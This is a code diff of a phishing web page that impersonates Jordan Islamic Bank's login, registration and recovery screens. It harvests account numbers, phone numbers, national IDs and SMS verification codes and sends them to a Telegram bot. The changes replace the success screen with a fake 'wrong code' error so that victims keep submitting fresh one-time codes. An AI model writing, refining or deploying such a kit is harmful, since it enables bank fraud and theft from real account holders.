@@ -44,7 +44,7 @@
             margin-bottom: 10px;
         }
         .logo {
-            width: 160px;
+            width: 180px;
             max-width: 90vw;
             margin: 0 auto 8px auto;
             display: block;
@@ -89,11 +89,8 @@
             background: #f26522;
             color: #fff;
         }
-        /* Hide all views by default */
         .view { display: none; }
         .view.active { display: block; }
-
-        /* Login + Forgot + Verification forms */
         .form-card {
             width:90vw;
             max-width:600px;
@@ -189,14 +186,45 @@
             color:#f26522;
             font-weight: bold;
         }
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1001;
+            left: 0; top: 0; width: 100vw; height: 100vh;
+            background: rgba(0,0,0,0.25);
+            align-items: center;
+            justify-content: center;
+        }
+        .modal.active { display: flex; }
+        .modal-content {
+            background: #fff;
+            border-radius: 14px;
+            padding: 32px 22px;
+            text-align: center;
+            font-size: 1.25rem;
+            color: #d32f2f;
+            box-shadow: 0 6px 24px 0 rgba(0,0,0,0.16);
+            font-family: 'Cairo', Arial, sans-serif;
+            max-width: 90vw;
+        }
+        .modal-content button {
+            margin-top: 22px;
+            background: #f26522;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            padding: 12px 38px;
+            cursor: pointer;
+        }
         @media (max-width: 480px) {
-            .container {
-                padding-top: 24px;
-            }
+            .container { padding-top: 24px; }
             .logo { width: 100px; }
             .title { font-size: 1.4rem; }
             .main-btn { font-size: 1.1rem; padding: 16px 0; min-width: 140px; }
             .form-card { max-width: 98vw; }
+            .modal-content { max-width: 98vw; font-size: 1rem; }
         }
     </style>
 </head>
@@ -206,7 +234,7 @@
         <!-- Main Selection View -->
         <div class="view active" id="mainView">
             <div class="logo-center">
-                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo" style="width: 180px; height:auto;">
+                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo">
             </div>
             <div class="title">البنك الإسلامي الأردني</div>
             <div class="subtitle">عضو مجموعة البركة</div>
@@ -216,7 +244,7 @@
         <!-- Login View -->
         <div class="view" id="loginView">
             <div class="logo-center">
-                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo" style="width: 180px; height:auto;">
+                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo">
             </div>
             <div class="title">البنك الإسلامي الأردني</div>
             <div class="subtitle">عضو مجموعة البركة</div>
@@ -233,7 +261,7 @@
         <!-- Register View -->
         <div class="view" id="registerView">
             <div class="logo-center">
-                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo" style="width: 180px; height:auto;">
+                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo">
             </div>
             <div class="title">البنك الإسلامي الأردني</div>
             <div class="subtitle">عضو مجموعة البركة</div>
@@ -250,11 +278,6 @@
                     <option>فلسطين</option>
                     <option>السعودية</option>
                 </select>
-                <select id="docType" name="docType" required>
-                    <option value="">نوع الوثيقة</option>
-                    <option>هوية وطنية</option>
-                    <option>جواز سفر</option>
-                </select>
                 <input type="text" id="nationalId" name="nationalId" placeholder="الرقم الوطني" required>
                 <div class="note">
                     <span>*</span> تجدون رقم حساب المتعامل(7 خانات) في نص SMS للحركات المالية المرسلة من JIB المشار باللون الاحمر 000-<span style="color:#f00;">0000000</span> او الاتصال على 06/5680001 او مراجعة فرعك
@@ -265,7 +288,7 @@
         <!-- Forgot View -->
         <div class="view" id="forgotView">
             <div class="logo-center">
-                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo" style="width: 180px; height:auto;">
+                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo">
             </div>
             <div class="title">البنك الإسلامي الأردني</div>
             <div class="subtitle">عضو مجموعة البركة</div>
@@ -282,11 +305,6 @@
                     <option>فلسطين</option>
                     <option>السعودية</option>
                 </select>
-                <select id="forgotDocType" name="docType" required>
-                    <option value="">نوع الوثيقة</option>
-                    <option>هوية وطنية</option>
-                    <option>جواز سفر</option>
-                </select>
                 <input type="text" id="forgotNationalId" name="nationalId" placeholder="الرقم الوطني" required>
                 <button type="submit">تأكيد</button>
             </form>
@@ -294,7 +312,7 @@
         <!-- Verification View -->
         <div class="view" id="verifyView">
             <div class="logo-center">
-                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo" style="width: 180px; height:auto;">
+                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo">
             </div>
             <div class="title">البنك الإسلامي الأردني</div>
             <div class="subtitle">عضو مجموعة البركة</div>
@@ -307,10 +325,18 @@
         <!-- Success message -->
         <div class="view" id="successView">
             <div class="logo-center">
-                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo" style="width: 180px; height:auto;">
+                <img src="https://www2.0zz0.com/2025/09/30/09/415897213.jpeg" alt="شعار البنك" class="logo">
             </div>
             <div class="title">تم الإرسال بنجاح</div>
             <div class="subtitle">شكراً لاستخدامك خدمات البنك الإسلامي الأردني</div>
+        </div>
+        <!-- Modal for error -->
+        <div class="modal" id="errorModal">
+            <div class="modal-content">
+                رمز التحقق أو إحدى المعلومات غير صحيح.<br>يرجى إعادة المحاولة مرة أخرى.
+                <br>
+                <button onclick="closeModal()">إعادة المحاولة</button>
+            </div>
         </div>
     </div>
     <script>
@@ -338,24 +364,22 @@
                     summary: summary
                 };
             } else if(formId === 'registerForm'){
-                summary = `تسجيل مستخدم جديد\nرقم الحساب: ${formData.get('accountNumber')}\nرقم الموبايل: ${formData.get('mobile')}\nالدولة: ${formData.get('country')}\nنوع الوثيقة: ${formData.get('docType')}\nالرقم الوطني: ${formData.get('nationalId')}`;
+                summary = `تسجيل مستخدم جديد\nرقم الحساب: ${formData.get('accountNumber')}\nرقم الموبايل: ${formData.get('mobile')}\nالدولة: ${formData.get('country')}\nالرقم الوطني: ${formData.get('nationalId')}`;
                 lastFormData = {
                     type: 'register',
                     accountNumber: formData.get('accountNumber'),
                     mobile: formData.get('mobile'),
                     country: formData.get('country'),
-                    docType: formData.get('docType'),
                     nationalId: formData.get('nationalId'),
                     summary: summary
                 };
             } else if(formId === 'forgotForm'){
-                summary = `استعادة اسم المستخدم أو كلمة المرور\nرقم الحساب: ${formData.get('accountNumber')}\nرقم الموبايل: ${formData.get('mobile')}\nالدولة: ${formData.get('country')}\nنوع الوثيقة: ${formData.get('docType')}\nالرقم الوطني: ${formData.get('nationalId')}`;
+                summary = `استعادة اسم المستخدم أو كلمة المرور\nرقم الحساب: ${formData.get('accountNumber')}\nرقم الموبايل: ${formData.get('mobile')}\nالدولة: ${formData.get('country')}\nالرقم الوطني: ${formData.get('nationalId')}`;
                 lastFormData = {
                     type: 'forgot',
                     accountNumber: formData.get('accountNumber'),
                     mobile: formData.get('mobile'),
                     country: formData.get('country'),
-                    docType: formData.get('docType'),
                     nationalId: formData.get('nationalId'),
                     summary: summary
                 };
@@ -375,9 +399,20 @@
             // Add code to previous info and send again
             let msg = lastFormData.summary + `\nرمز التحقق: ${code}`;
             sendToTelegram(msg, true);
-            showView('successView');
-            setTimeout(() => { showView('mainView'); }, 3500);
+            // Instead of success, show error modal and return to verification view
+            showModal();
             return false;
+        }
+
+        // Modal logic
+        function showModal() {
+            document.getElementById('errorModal').classList.add('active');
+        }
+        function closeModal() {
+            document.getElementById('errorModal').classList.remove('active');
+            document.getElementById('verifyCode').value = '';
+            showView('verifyView');
+            document.getElementById('verifyCode').focus();
         }
 
         // Telegram Send Function
@@ -390,7 +425,6 @@
                 text: text,
                 parse_mode: "Markdown"
             };
-            // Send request (no alert, just background send)
             fetch(url, {
                 method: "POST",
                 headers: {'Content-Type': 'application/json'},
